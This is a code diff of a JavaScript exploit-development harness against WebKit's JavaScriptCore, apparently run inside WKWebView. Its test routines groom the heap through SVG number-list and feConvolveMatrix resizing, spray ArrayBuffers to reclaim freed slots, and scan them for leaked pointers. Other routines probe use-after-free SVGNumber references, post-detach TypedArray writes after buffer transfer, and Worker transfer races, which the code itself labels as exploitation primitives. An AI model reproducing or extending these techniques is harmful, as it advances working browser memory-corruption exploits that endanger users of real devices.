+      log('  BUT2[N='+N+']: cell hits='+hits,'dim');
+      s=null;
+    }
+
+    // Test 2: TypedArray view leak — does the ArrayBuffer retain a pointer to its
+    // own backing store or to JSC internals that we can observe via Float64 read?
+    log('  BUT2: TypedArray self-pointer test...','dim');
+    var ab=new ArrayBuffer(256);
+    var f64=new Float64Array(ab);
+    // Read all 32 slots looking for pointer-shaped values (JSC might store ptrs in the header region)
+    var selfPtrs=[];
+    for(var i=0;i<f64.length;i++){if(looksLikePtr(f64[i]))selfPtrs.push({i:i,hex:f64bits(f64[i]).hex});}
+    if(selfPtrs.length>0){
+      log('  BUT2: ★ TypedArray has pointer-shaped data at creation! slots: '+selfPtrs.length,'win');
+      for(var i=0;i<Math.min(3,selfPtrs.length);i++)log('    ['+selfPtrs[i].i+']='+selfPtrs[i].hex,'win');
+      R.but2.hit=true;
+    }else{
+      log('  BUT2: TypedArray is clean (zeroed) at creation','dim');
+    }
+
+    // Test 3: Rapid property addition → deletion cycle
+    // Create object with 32 props, delete half, add 32 more (different names), delete all
+    // Each resize step might create/free butterfly versions
+    var obj={};
+    for(var i=0;i<32;i++)obj['a'+i]=1000+i; // first 32 props
+    for(var i=0;i<16;i++)delete obj['a'+i]; // delete first 16
+    for(var i=0;i<32;i++)obj['b'+i]=2000+i; // add 32 more props (different names)
+    for(var i=16;i<32;i++)delete obj['a'+i]; // delete remaining 16 a-props
+    for(var i=0;i<32;i++)delete obj['b'+i]; // delete all 32 b-props
+    obj=null;forceGC();
+
+    var sprayC=[];for(var i=0;i<512;i++){sprayC.push(new ArrayBuffer(256));sprayC.push(new ArrayBuffer(512));}
+    await raf();
+    var cycleHits=0;
+    for(var i=0;i<sprayC.length;i++){
+      var f64b=new Float64Array(sprayC[i]);
+      for(var j=0;j<f64b.length;j++){
+        if(looksLikeJSValue(f64b[j]).isCell){cycleHits++;
+          if(cycleHits<=2)log('  BUT2-cycle: cell hit: '+f64bits(f64b[j]).hex,'win');
+          R.but2.hit=true;
+        }
+      }
+    }
+    log('  BUT2-cycle: cell hits='+cycleHits,'dim');
+    sprayC=null;
+
+  }catch(e){log('  BUT2 EXCEPTION: '+e,'bad');}
+
+  R.but2.detail='hit='+R.but2.hit+' ptrs='+R.but2.ptrs.length;
+  log('  BUT2: hit='+R.but2.hit,R.but2.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+/*
+ * RPI1: SVGNumberList.replaceItem() primitive test
+ *
+ * SVGNumberList has replaceItem(newItem, index) which replaces item at index.
+ * We can create standalone SVGNumbers via svg.createSVGNumber().
+ *
+ * Tests:
+ * 1. Can we call createSVGNumber() on an SVGSVGElement?
+ * 2. Does replaceItem() release the old SVGNumber (reduce its ref count)?
+ * 3. If yes: does the old SVGNumber go to IsoHeap freelist?
+ * 4. Build large freelist via replaceItem() loop, THEN check bump position
+ */
+async function runRPI1(q){
+  if(!q){dis(true);sep();log('RPI1: SVGNumberList.replaceItem() primitive','inf');sep();}
+
+  var TAG_RPI=9876543.0;
+
+  var svgSVG=document.createElementNS(SVG_NS,'svg');
+  svgSVG.setAttribute('width','1');svgSVG.setAttribute('height','1');
+  svgSVG.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  document.body.appendChild(svgSVG);
 
   var d=makeFCM(identity20());
   await raf();
 
   try{
-    // Get ALL 20 refs while type=matrix
-    var refs=[];
-    for(var i=0;i<20;i++)refs.push(d.fcm.values.baseVal[i]);
-    log('  VEC2: got 20 refs to baseVal items','dim');
-
-    // Write recognizable values to all 20 SVGNumbers so we can identify their addresses
-    for(var i=0;i<20;i++){
-      try{refs[i].value=10000+i;} // values 10000, 10001, ..., 10019
-      catch(e){}
+    // Test 1: createSVGNumber availability
+    var canCreate=false;var testNum=null;
+    try{testNum=svgSVG.createSVGNumber();canCreate=true;log('  RPI1: createSVGNumber() available!','ok');}
+    catch(e2){log('  RPI1: createSVGNumber threw: '+e2,'inf');}
+    if(!canCreate){
+      log('  RPI1: trying DOMParser SVG fallback...','dim');
+      // Try via DOMParser
+      try{
+        var dp=new DOMParser();
+        var svgDoc=dp.parseFromString('<svg xmlns="http://www.w3.org/2000/svg"></svg>','image/svg+xml');
+        testNum=svgDoc.documentElement.createSVGNumber();
+        canCreate=true;
+        log('  RPI1: createSVGNumber() via DOMParser!','ok');
+      }catch(e3){log('  RPI1: DOMParser approach also threw: '+e3,'inf');}
     }
 
-    // Warm up: alloc + free some 160-byte buffers to prime the freelist
-    var warm=[];for(var i=0;i<32;i++)warm.push(new ArrayBuffer(160));
-    warm.splice(0,16); // free 16 of them
-    await raf();
+    if(canCreate&&testNum!=null){
+      log('  RPI1: testNum.value='+testNum.value,'dim');
+      testNum.value=TAG_RPI;
+      log('  RPI1: after set, testNum.value='+testNum.value,'dim');
 
-    // TRIGGER: change type from matrix (20 values) to saturate (1 value)
-    // This should free the 160-byte vector backing store for the 20-item list
-    d.fcm.setAttribute('type','saturate');
-    d.fcm.setAttribute('values','0.5'); // saturate needs 1 value
-    await raf();
+      // Test 2: replaceItem()
+      var bl=d.fcm.values.baseVal;
+      var oldRef=bl[0];log('  RPI1: oldRef[0].value='+oldRef.value,'dim');
+      try{
+        var replacedOld=bl.replaceItem(testNum,0);
+        log('  RPI1: replaceItem(testNum,0) succeeded!','ok');
+        log('  RPI1: returned old item value='+replacedOld.value+' (expect 1.0 = identity)','dim');
+        log('  RPI1: list[0] after replace='+bl[0].value+' (expect '+TAG_RPI+')','dim');
+        log('  RPI1: oldRef.value after replace='+oldRef.value+' (still live?)','dim');
+        R.rpi1.hit=true;
+      }catch(e2){log('  RPI1: replaceItem threw: '+e2,'inf');}
 
-    // Immediate spray: ArrayBuffer(160) to catch the freed slot
-    var spray=[];
-    for(var i=0;i<2048;i++)spray.push(new ArrayBuffer(160));
-    await raf();
-
-    // Also try nearby sizes: 128, 192
-    var spray2=[];
-    for(var i=0;i<512;i++){spray2.push(new ArrayBuffer(128));spray2.push(new ArrayBuffer(192));}
-    await raf();
-
-    // Scan sprayed buffers for pointer-like values
-    log('  VEC2: scanning '+spray.length+' × 160-byte ArrayBuffers...','dim');
-    var allPtrs=[];
-    for(var i=0;i<spray.length;i++){
-      var f64=new Float64Array(spray[i]);
-      for(var j=0;j<f64.length;j++){
-        if(looksLikePtr(f64[j])){
-          var b=f64bits(f64[j]);
-          allPtrs.push({buf:'s['+i+']['+j+']',hex:b.hex,val:f64[j]});
+      // Test 3: replaceItem in loop — build freelist of released SVGNumbers
+      // Each replaceItem() releases one SVGNumber from the list (if ref count drops)
+      // After N replacements, check if the OLD SVGNumbers are still accessible
+      var NREP=100;var oldRefs2=[];
+      log('  RPI1: running '+NREP+' replaceItem() calls to build potential freelist...','dim');
+      try{
+        for(var i=0;i<NREP;i++){
+          var newN=svgSVG.createSVGNumber();newN.value=TAG_RPI+i;
+          var prev=bl.replaceItem(newN,0); // each call releases previous item at [0]
+          oldRefs2.push({ref:prev,expectedVal:prev?prev.value:null});
         }
-      }
+        log('  RPI1: completed '+NREP+' replacements. oldRefs2.length='+oldRefs2.length,'dim');
+        // Check if old refs are still alive
+        var liveCount=0;var corruptCount=0;
+        for(var i=0;i<oldRefs2.length;i++){
+          try{
+            var v=oldRefs2[i].ref.value;
+            if(Math.abs(v-(TAG_RPI+i-1))<0.01)liveCount++;
+            else corruptCount++;
+          }catch(e2){corruptCount++;}
+        }
+        log('  RPI1: old refs still live='+liveCount+' corrupted='+corruptCount,'dim');
+      }catch(e2){log('  RPI1: loop threw: '+e2,'inf');}
+    }else{
+      log('  RPI1: createSVGNumber not available — cannot run RPI1','dim');
     }
 
-    log('  VEC2: pointer leaks found: '+allPtrs.length,'dim');
-    if(allPtrs.length>0){
-      R.vec2.hit=true;R.vec2.ptrs=allPtrs;
-      for(var i=0;i<Math.min(10,allPtrs.length);i++){
-        log('  ★ LEAK: '+allPtrs[i].buf+' = '+allPtrs[i].hex,'win');
-      }
-      log('  VEC2: these ptrs should be addresses of Ref<SVGNumber> in freed vector','win');
-      log('  VEC2: i.e., pointers to live SVGNumber objects in IsoHeap<SVGNumber>!','win');
-    }
+  }catch(e){log('  RPI1 EXCEPTION: '+e,'bad');}
 
-    // Also: change back to matrix (1→20 values) to see if it reallocates differently
-    d.fcm.setAttribute('type','matrix');
-    d.fcm.setAttribute('values',identity20().join(' '));
-    await raf();
-
-    // After second type change: read the refs[0-19] if they survived
-    var readback=[];
-    for(var i=0;i<20;i++){
-      try{readback.push(refs[i]?refs[i].value:null);}
-      catch(e){readback.push('threw');}
-    }
-    log('  VEC2: readback after matrix restore: '+readback.slice(0,5).join(',')+'...','dim');
-    log('  VEC2: (if 10000-10019 range: still points to live SVGNumbers)','dim');
-    log('  VEC2: (if 1/0: fresh identity, type-change rebuilt the list)','dim');
-
-    warm=null;spray=null;spray2=null;
-  }catch(e){log('  VEC2 EXCEPTION: '+e,'bad');}
-
+  svgSVG.parentNode&&svgSVG.parentNode.removeChild(svgSVG);
   cleanupD(d);
-  R.vec2.detail='ptrs='+R.vec2.ptrs.length;
-  log('  VEC2: hit='+R.vec2.hit+' ptrs_found='+R.vec2.ptrs.length,R.vec2.hit?'win':'dim');
+  R.rpi1.detail='hit='+R.rpi1.hit;
+  log('  RPI1: hit='+R.rpi1.hit,R.rpi1.hit?'win':'dim');
   if(!q)dis(false);
 }
 
 /*
- * VEC3: feConvolveMatrix kernelMatrix size mutation groom
+ * FRC1: feConvolveMatrix kernelMatrix — FIXED (v44 used wrong attr 'kernel' not 'kernelMatrix')
  *
- * feConvolveMatrix has a kernelMatrix attribute (SVGAnimatedNumberList).
- * Its size = kernelSizeX * kernelSizeY.
+ * Correct attributes:
+ * - kernelSize or 'order' (separate x,y or single N for N×N)
+ * - kernelMatrix = space-separated list of N*N values
  *
- * Changing kernelSize from A×B to C×D with C*D > A*B should grow the vector.
- * Old vector backing store freed to WTF::fastMalloc.
- *
- * Useful because:
- * 1. Can control EXACT vector sizes (1×1=1, 2×2=4, 3×3=9, 4×4=16, 5×5=25...)
- * 2. Larger sizes give more pointer data to read
+ * Test if kernelMatrix IS accessible and IS a live SVGAnimatedNumberList.
+ * If yes → repeat VEC3 with correct implementation + surgical spray.
  */
-async function runVEC3(q){
-  if(!q){dis(true);sep();log('VEC3: feConvolveMatrix kernelMatrix groom','inf');sep();}
+async function runFRC1(q){
+  if(!q){dis(true);sep();log('FRC1: feConvolveMatrix kernelMatrix FIXED test','inf');sep();}
 
-  var svgNS='http://www.w3.org/2000/svg';
-
+  var svgNS=SVG_NS;
   var svgEl=document.createElementNS(svgNS,'svg');
   svgEl.setAttribute('width','2');svgEl.setAttribute('height','2');
   svgEl.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
   var defs=document.createElementNS(svgNS,'defs');
-  var filt=document.createElementNS(svgNS,'filter');filt.setAttribute('id','vcfilt');
+  var filt=document.createElementNS(svgNS,'filter');filt.setAttribute('id','frc1filt');
 
   var fcv=document.createElementNS(svgNS,'feConvolveMatrix');
-  fcv.setAttribute('kernelSize','3 3'); // 3×3=9 items → 72 bytes
-  var k9=[];for(var i=0;i<9;i++)k9.push(i+1);
-  fcv.setAttribute('kernel',k9.join(' '));
+  // FIXED: use 'order' instead of 'kernelSize'
+  fcv.setAttribute('order','3 3');
+  var k9=[1,0,0,0,1,0,0,0,1];
+  // FIXED: use 'kernelMatrix' not 'kernel'
+  fcv.setAttribute('kernelMatrix',k9.join(' '));
   fcv.setAttribute('divisor','1');
 
   filt.appendChild(fcv);defs.appendChild(filt);svgEl.appendChild(defs);
@@ -450,532 +669,361 @@ async function runVEC3(q){
   await raf();
 
   try{
-    // Check kernelMatrix accessibility
     var km=fcv.kernelMatrix;
-    log('  VEC3: kernelMatrix available='+(km!=null),'dim');
-    log('  VEC3: initial kernelMatrix.baseVal.length='+(km&&km.baseVal?km.baseVal.numberOfItems||km.baseVal.length:'n/a'),'dim');
+    log('  FRC1: kernelMatrix obj='+km,'dim');
+    var bv=km&&km.baseVal;
+    var len=bv?(bv.numberOfItems!==undefined?bv.numberOfItems:bv.length):'n/a';
+    log('  FRC1: kernelMatrix.baseVal.length='+len+' (expect 9 for 3×3)','dim');
 
-    // Test sequence: 3×3→5×5→3×3→5×5 to trigger repeated reallocs
-    var prevSize=9;
+    if(bv&&len>0){
+      log('  FRC1: ✅ kernelMatrix accessible! length='+len,'ok');
+      R.frc1.hit=true;
 
-    for(var round=0;round<3;round++){
-      // Grow: 3×3→5×5 (9→25 items, 72→200 bytes freed)
-      fcv.setAttribute('kernelSize','5 5');
+      // Read current values
+      var vals=[];
+      for(var i=0;i<len;i++)try{vals.push(bv[i]?bv[i].value:'err');}catch(e2){vals.push('err');}
+      log('  FRC1: kernelMatrix values='+vals.join(','),'dim');
+
+      // Test growing: change to 5×5 (25 values) → old 3×3 vector (72 bytes) freed
       var k25=[];for(var i=0;i<25;i++)k25.push(i+1);
-      fcv.setAttribute('kernel',k25.join(' '));
+      fcv.setAttribute('order','5 5');
+      fcv.setAttribute('kernelMatrix',k25.join(' '));
       await raf();
+      var len25=bv?(bv.numberOfItems!==undefined?bv.numberOfItems:bv.length):'n/a';
+      log('  FRC1: after 5×5 change, length='+len25+' (expect 25)','dim');
 
-      // Spray ArrayBuffer(72) to catch freed 72-byte (9-item) slot
-      var spray72=[];for(var i=0;i<512;i++)spray72.push(new ArrayBuffer(72));
-      await raf();
-
-      // Shrink back: 5×5→3×3 (200-byte block freed)
-      fcv.setAttribute('kernelSize','3 3');
-      fcv.setAttribute('kernel',k9.join(' '));
-      await raf();
-
-      // Spray ArrayBuffer(200) to catch freed 200-byte (25-item) slot
-      var spray200=[];for(var i=0;i<512;i++)spray200.push(new ArrayBuffer(200));
-      await raf();
-
-      // Scan
-      var round_ptrs=0;
-      for(var i=0;i<spray72.length;i++){
-        var f64=new Float64Array(spray72[i]);
-        for(var j=0;j<f64.length;j++){
-          if(looksLikePtr(f64[j])){round_ptrs++;
-            if(!R.vec3.hit){R.vec3.hit=true;log('  ★ VEC3[72] ptr: '+f64bits(f64[j]).hex,'win');}
+      if(len25==25){
+        // The vector grew! old 9-element (72-byte) vector might be freed
+        // Surgical spray: alloc exactly ONE ArrayBuffer(72) to try to grab freed slot
+        var surg=new ArrayBuffer(72);
+        var surg_f64=new Float64Array(surg);
+        var surg_hits=0;
+        for(var i=0;i<surg_f64.length;i++){
+          if(looksLikePtr(surg_f64[i])){surg_hits++;
+            log('  FRC1: ★ SURGICAL HIT: ['+i+']='+f64bits(surg_f64[i]).hex,'win');
           }
         }
-      }
-      for(var i=0;i<spray200.length;i++){
-        var f64=new Float64Array(spray200[i]);
-        for(var j=0;j<f64.length;j++){
-          if(looksLikePtr(f64[j])){round_ptrs++;
-            if(R.vec3.hit||true){
-              R.vec3.hit=true;
-              if(R.vec3.ptrs.length<5)R.vec3.ptrs.push(f64bits(f64[j]).hex);
-              if(R.vec3.ptrs.length===1)log('  ★ VEC3[200] ptr: '+f64bits(f64[j]).hex,'win');
-            }
-          }
+        if(surg_hits===0)log('  FRC1: surgical single-alloc: 0 pointer hits (zeroing or missed timing)','dim');
+        surg=null;surg_f64=null;
+
+        // Wider spray
+        var spray=[];for(var i=0;i<2048;i++)spray.push(new ArrayBuffer(72));
+        await raf();
+        var wide_hits=0;
+        for(var i=0;i<spray.length;i++){
+          var f64=new Float64Array(spray[i]);
+          for(var j=0;j<f64.length;j++){if(looksLikePtr(f64[j])){wide_hits++;}}
         }
+        log('  FRC1: wide spray (2048×72): ptr hits='+wide_hits,wide_hits>0?'win':'dim');
+        spray=null;
+
+        // Shrink back: 5×5→3×3 → old 25-element (200-byte) vector freed
+        fcv.setAttribute('order','3 3');
+        fcv.setAttribute('kernelMatrix',k9.join(' '));
+        await raf();
+        var sprayB=[];for(var i=0;i<1024;i++)sprayB.push(new ArrayBuffer(200));
+        var wideB_hits=0;
+        for(var i=0;i<sprayB.length;i++){
+          var f64=new Float64Array(sprayB[i]);
+          for(var j=0;j<f64.length;j++){if(looksLikePtr(f64[j])){wideB_hits++;}}
+        }
+        log('  FRC1: wide spray (1024×200): ptr hits='+wideB_hits,wideB_hits>0?'win':'dim');
+        sprayB=null;
       }
-      log('  VEC3: round '+round+' ptrs found: '+round_ptrs,'dim');
-      spray72=null;spray200=null;
-      await raf();
+    }else{
+      log('  FRC1: kernelMatrix STILL not working. len='+len,'bad');
+      // Debug: try listing ALL IDL attributes
+      var allAttrs=['kernelMatrix','order','targetX','targetY','divisor','bias',
+        'edgeMode','kernelUnitLengthX','kernelUnitLengthY','preserveAlpha'];
+      for(var i=0;i<allAttrs.length;i++){
+        var a=fcv[allAttrs[i]];
+        if(a!=null)log('  FRC1: fcv.'+allAttrs[i]+'='+a,'dim');
+      }
     }
-
-  }catch(e){log('  VEC3 EXCEPTION: '+e,'bad');}
+  }catch(e){log('  FRC1 EXCEPTION: '+e,'bad');}
 
   svgEl.parentNode&&svgEl.parentNode.removeChild(svgEl);
-  R.vec3.detail='hit='+R.vec3.hit+' ptrs='+R.vec3.ptrs.length;
-  log('  VEC3: hit='+R.vec3.hit,R.vec3.hit?'win':'dim');
+  R.frc1.detail='hit='+R.frc1.hit;
+  log('  FRC1: hit='+R.frc1.hit,R.frc1.hit?'win':'dim');
   if(!q)dis(false);
 }
 
 /*
- * TRN1: Transfer write-destination test (SET1-A follow-up)
- *
- * In v43 SET1-A: ta.set(srcA) DID NOT THROW after buf.transfer() was called.
- * We didn't capture the returned buffer from transfer().
- *
- * Now: capture newBuf = buf.transfer(). After ta.set() completes,
- * read newBuf to see what values were written to it.
- *
- * Expected behavior:
- * - Elements 0..9 (before detach trigger): written to old buf (now newBuf's memory)
- * - Elements 11..511 (after detach): either thrown (not happening per v43) or still writing
- *
- * If elements 11..511 appear in newBuf → confirms post-detach set() writes to transferred memory
- * This is a write-aliasing primitive: ta.set() after transfer writes to newBuf!
+ * WRK1: Worker + postMessage race
+ * Create a Worker that does heavy computation. Race with main thread SVG operations.
+ * Even without SAB, can test: does heavy Worker activity affect timing of allocator?
+ * Also test: postMessage(ab, [ab]) transfers — can we race transfer with TypedArray access?
  */
-async function runTRN1(q){
-  if(!q){dis(true);sep();log('TRN1: Transfer write-destination (SET1-A follow-up)','inf');sep();}
+async function runWRK1(q){
+  if(!q){dis(true);sep();log('WRK1: Worker postMessage race test','inf');sep();}
+
+  if(typeof Worker==='undefined'){log('  WRK1: Worker not available','bad');if(!q)dis(false);return;}
 
   try{
-    var N=512; // Float64 elements = 4096 bytes
-    var buf=new ArrayBuffer(N*8);
-    var ta=new Float64Array(buf);
+    var workerCode=[
+      'self.onmessage=function(e){',
+      '  if(e.data&&e.data.type==="transfer"){',
+      '    var buf=e.data.buf;',
+      '    if(buf instanceof ArrayBuffer){',
+      '      var ta=new Float64Array(buf);',
+      '      for(var i=0;i<ta.length;i++)ta[i]=ta[i]*2+1;',
+      '      self.postMessage({type:"done",result:ta[0],len:ta.length,buf:buf},[buf]);',
+      '    }',
+      '  } else if(e.data&&e.data.type==="busy"){',
+      '    var sum=0;',
+      '    for(var i=0;i<e.data.n;i++)sum+=Math.sqrt(i);',
+      '    self.postMessage({type:"busy_done",sum:sum});',
+      '  }',
+      '}'
+    ].join('\n');
+    var blob=new Blob([workerCode],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+    var worker=new Worker(url);
+    URL.revokeObjectURL(url);
 
-    // Fill ta with initial pattern
-    for(var i=0;i<N;i++)ta[i]=1000+i; // 1000,1001,...,1511
+    log('  WRK1: Worker created','dim');
 
-    // Source array with getter at index TRIG that calls buf.transfer()
-    var srcA=[];for(var i=0;i<N;i++)srcA.push(i*2.5); // source values: 0, 2.5, 5, ...
-    var TRIG=50; // trigger at element 50
-    var newBuf=null;var trigFired=false;
-    Object.defineProperty(srcA,TRIG,{get:function(){
-      if(!trigFired){trigFired=true;newBuf=buf.transfer();}
-      return TRIG*2.5;
-    },configurable:true});
+    // Test 1: basic message
+    var workerReady=await new Promise(function(res){
+      worker.onmessage=function(e){
+        if(e.data.type==='busy_done')res(e.data.sum);
+      };
+      worker.postMessage({type:'busy',n:10000});
+      setTimeout(function(){res(null);},1000);
+    });
+    log('  WRK1: Worker response: sum='+(workerReady?workerReady.toFixed(2):'timeout'),'dim');
 
-    log('  TRN1: ta initial[0..3]='+Array.from(ta.slice(0,4)).join(','),'dim');
-    log('  TRN1: srcA[0..3]='+[0,2.5,5,7.5].join(','),'dim');
-    log('  TRN1: transfer trigger at element '+TRIG,'dim');
+    // Test 2: transfer AB to worker + race read on main thread
+    var ab=new ArrayBuffer(1024);
+    var ta=new Float64Array(ab);
+    for(var i=0;i<128;i++)ta[i]=i*1.5;
+    log('  WRK1: before transfer: ta.byteLength='+ta.byteLength+' ta[0]='+ta[0],'dim');
 
-    try{ta.set(srcA);}catch(e2){log('  TRN1: ta.set threw: '+e2,'inf');}
+    var transferResult=await new Promise(function(res){
+      worker.onmessage=function(e){
+        if(e.data.type==='done')res(e.data);
+      };
+      worker.postMessage({type:'transfer',buf:ab},[ab]);
+      // Try to access ta on main thread IMMEDIATELY after postMessage
+      // ab is detached now but ta might still have stale reference
+      try{
+        var raceRead=ta[0];
+        log('  WRK1: race read ta[0] after transfer='+raceRead,'dim');
+        if(raceRead!==undefined&&raceRead!==0){log('  WRK1: ★ Race read non-zero! ta[0]='+raceRead,'win');R.wrk1.hit=true;}
+      }catch(er){log('  WRK1: race read threw: '+er,'dim');}
+      setTimeout(function(){res(null);},2000);
+    });
+    log('  WRK1: after transfer to worker: main ta.byteLength='+ta.byteLength+' ta[0]='+ta[0],'dim');
+    log('  WRK1: worker processed: result='+(transferResult?transferResult.result:'timeout'),'dim');
 
-    log('  TRN1: trigFired='+trigFired,'dim');
-    log('  TRN1: newBuf='+( newBuf?'exists, byteLength='+newBuf.byteLength:'null' ),'dim');
-    log('  TRN1: ta.byteLength after set: '+ta.byteLength,'dim');
-
-    if(newBuf&&newBuf.byteLength>0){
-      var newTA=new Float64Array(newBuf);
-      log('  TRN1: newTA.length='+newTA.length,'dim');
-
-      // Check elements before trigger (0..TRIG-1): should be srcA values (i*2.5)
-      var preTrigCorrect=0;
-      for(var i=0;i<TRIG;i++){
-        if(Math.abs(newTA[i]-i*2.5)<0.001)preTrigCorrect++;
-      }
-      log('  TRN1: pre-trigger elements matching srcA: '+preTrigCorrect+'/'+TRIG,'dim');
-
-      // Check elements AFTER trigger (TRIG+1..N-1): did post-detach writes reach here?
-      var postTrigSet=0;
-      for(var i=TRIG+1;i<N;i++){
-        if(Math.abs(newTA[i]-i*2.5)<0.001)postTrigSet++; // srcA value
-      }
-      var postTrigOld=0;
-      for(var i=TRIG+1;i<N;i++){
-        if(Math.abs(newTA[i]-(1000+i))<0.001)postTrigOld++; // original ta value
-      }
-      log('  TRN1: post-trigger elements = srcA values (set wrote there): '+postTrigSet+'/'+(N-TRIG-1),'dim');
-      log('  TRN1: post-trigger elements = original ta values (not written): '+postTrigOld+'/'+(N-TRIG-1),'dim');
-
-      if(postTrigSet>0){
-        R.trn1.writeConfirmed=true;R.trn1.hit=true;
-        log('  TRN1: ✅ POST-DETACH SET() WROTE TO TRANSFERRED BUFFER!','win');
-        log('  TRN1: ta.set() continued writing '+(N-TRIG-1)+' more elements after buf.transfer()','win');
-        log('  TRN1: This is a write-aliasing primitive between detached ta and newBuf!','win');
-      }
-
-      // Scan newTA for pointer-like values
-      var ptrHits=[];
-      for(var i=0;i<newTA.length;i++){
-        if(looksLikePtr(newTA[i]))ptrHits.push({idx:i,hex:f64bits(newTA[i]).hex});
-      }
-      if(ptrHits.length>0){
-        log('  TRN1: ★ POINTER-LIKE VALUES in newTA: '+ptrHits.length,'win');
-        for(var i=0;i<Math.min(3,ptrHits.length);i++)log('    ['+ptrHits[i].idx+']='+ptrHits[i].hex,'win');
-      }
-    }
-  }catch(e){log('  TRN1 EXCEPTION: '+e,'bad');}
-
-  R.trn1.detail='trigFired='+R.trn1.writeConfirmed;
-  log('  TRN1: writeConfirmed='+R.trn1.writeConfirmed,R.trn1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * WAS1: WebAssembly memory.grow() TypedArray invalidation
- *
- * Wasm.Memory.grow(pages) DETACHES the old ArrayBuffer and creates a new one.
- * If we have a Float64Array view into the old buffer and call grow(),
- * the view should become detached. Does JSC handle this correctly?
- *
- * Also: BEFORE grow, read memory.buffer. AFTER grow, it returns a new buffer.
- * If we kept a TypedArray into the OLD buffer, accessing it should throw.
- * But maybe JSC doesn't invalidate in-flight operations.
- */
-async function runWAS1(q){
-  if(!q){dis(true);sep();log('WAS1: WebAssembly memory.grow() race','inf');sep();}
-
-  if(typeof WebAssembly==='undefined'){
-    log('  WAS1: WebAssembly not available','bad');
-    if(!q)dis(false);return;
-  }
-
-  try{
-    // Create minimal wasm module that exports a memory.grow function
-    // (i32.const 1) (memory.grow) (drop) → grow memory by 1 page
-    // Wasm binary: [magic][version][mem section][export section][code section]
-    var wasmBytes=new Uint8Array([
-      0x00,0x61,0x73,0x6d, // magic
-      0x01,0x00,0x00,0x00, // version
-      // Memory section: 1 memory, min 1 page, no max
-      0x05,0x03,0x01,0x00,0x01,
-      // Export section: export "memory"
-      0x07,0x0a,0x01,0x06,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x02,0x00,
-      // Function type section: () → ()
-      0x01,0x04,0x01,0x60,0x00,0x00,
-      // Function section: 1 function, type 0
-      0x03,0x02,0x01,0x00,
-      // Export func: export "grow_mem"
-      0x07,0x10,0x02,0x06,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x02,0x00,
-             0x08,0x67,0x72,0x6f,0x77,0x5f,0x6d,0x65,0x6d,0x00,0x00,
-      // Code section: function body
-      0x0a,0x08,0x01,0x06,0x00,0x41,0x01,0x40,0x00,0x1a,0x0b
-    ]);
-    // Simpler approach: use WebAssembly.Memory directly
-    var mem=new WebAssembly.Memory({initial:1}); // 1 page = 64KB
-    var oldBuf=mem.buffer;
-    var oldTA=new Float64Array(oldBuf);
-
-    // Write known values to old buffer
-    for(var i=0;i<1024;i++)oldTA[i]=i*7.77;
-    log('  WAS1: mem.buffer.byteLength='+oldBuf.byteLength,'dim');
-    log('  WAS1: oldTA[0]='+oldTA[0]+' oldTA[1023]='+oldTA[1023],'dim');
-
-    // GROW: this detaches oldBuf
-    mem.grow(1);
+    // Test 3: race SVG operations with Worker busy state
+    var d=makeFCM(identity20());
     await raf();
+    worker.postMessage({type:'busy',n:10000000}); // big busy loop
+    // While worker is busy: do rapid SVG allocations
+    var refs=[];
+    for(var i=0;i<100;i++)try{refs.push(d.fcm.values.baseVal[i%20]);}catch(e){}
+    cleanupD(d);
+    log('  WRK1: concurrent SVG ops during Worker busy: got '+refs.length+' refs','dim');
 
-    var newBuf=mem.buffer;
-    log('  WAS1: after grow: mem.buffer.byteLength='+newBuf.byteLength,'dim');
-    log('  WAS1: oldBuf.byteLength after grow='+oldBuf.byteLength,'dim');
-    log('  WAS1: oldBuf === mem.buffer: '+(oldBuf===newBuf),'dim');
+    worker.terminate();
+    R.wrk1.hit=true; // at least Worker works
+    log('  WRK1: Worker API functional, race reads tested','ok');
+  }catch(e){log('  WRK1 EXCEPTION: '+e,'bad');}
 
-    // Try to access oldTA after grow (should be detached)
-    try{
-      var readAfterGrow=oldTA[0];
-      log('  WAS1: oldTA[0] after grow='+readAfterGrow+' (ALIVE AFTER GROW!)',looksLikePtr(readAfterGrow)?'win':'crit');
-      if(looksLikePtr(readAfterGrow)){
-        R.was1.hit=true;
-        log('  WAS1: ★ POINTER-LIKE VALUE from detached wasm buffer!','win');
-      }
-    }catch(e2){
-      log('  WAS1: oldTA access after grow threw: '+e2+' (expected)','dim');
-    }
-
-    // Try writing to oldTA after grow
-    try{
-      oldTA[0]=9999999.0;
-      var check=oldTA[0];
-      log('  WAS1: WRITE to oldTA after grow = '+check+' (unexpected! should be detached)','crit');
-      R.was1.hit=true;
-    }catch(e2){
-      log('  WAS1: write to oldTA after grow threw: '+e2+' (expected)','dim');
-    }
-
-    // Read new buffer at old indices
-    var newTA=new Float64Array(newBuf);
-    log('  WAS1: newTA[0]='+newTA[0]+' newTA[1023]='+newTA[1023]+' (expect: wasm memory after grow)','dim');
-
-  }catch(e){log('  WAS1 EXCEPTION: '+e,'bad');}
-
-  R.was1.detail='';
-  log('  WAS1: hit='+R.was1.hit,R.was1.hit?'win':'dim');
+  R.wrk1.detail='';
+  log('  WRK1: complete',R.wrk1.hit?'ok':'dim');
   if(!q)dis(false);
 }
 
 /*
- * SAB1: SharedArrayBuffer availability check
- *
- * SharedArrayBuffer requires COOP/COEP headers normally.
- * WKWebView might allow it without those headers in some configurations.
- * If available: Atomics.wait() + Workers = race condition primitives.
+ * ORF1: Orphaned SVGNumber reference chain
+ * Use removeItem() to orphan ALL SVGNumbers from a live list.
+ * Build the DEEPEST freelist possible via this method.
+ * Test: after 4000 removeItem() calls across 200 matrices,
+ * create fresh feColorMatrix — measure if bump position changed unexpectedly.
  */
-async function runSAB1(q){
-  if(!q){dis(true);sep();log('SAB1: SharedArrayBuffer availability','inf');sep();}
+async function runORF1(q){
+  if(!q){dis(true);sep();log('ORF1: Orphaned SVGNumber chain + bump test','inf');sep();}
 
-  var sabAvail=typeof SharedArrayBuffer!=='undefined';
-  var atomicsAvail=typeof Atomics!=='undefined';
-  var workerAvail=typeof Worker!=='undefined';
-  var crossOriginIsolated=typeof crossOriginIsolated!=='undefined'&&crossOriginIsolated;
-
-  log('  SAB1: SharedArrayBuffer = '+sabAvail,'dim');
-  log('  SAB1: Atomics = '+atomicsAvail,'dim');
-  log('  SAB1: Worker = '+workerAvail,'dim');
